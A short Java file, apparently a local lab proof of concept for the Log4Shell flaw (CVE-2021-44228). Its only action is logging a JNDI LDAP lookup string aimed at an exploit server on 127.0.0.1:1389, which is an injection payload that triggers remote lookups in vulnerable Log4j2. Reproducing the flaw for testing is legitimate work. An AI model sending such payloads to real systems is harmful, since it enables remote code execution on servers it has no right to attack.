package log4j2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

class CVE_2021_44228 {
    public static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/sYBTaDXcty/Plain/Dir/eyJwYXRoIjoiZDpcXCJ9}");
    }
}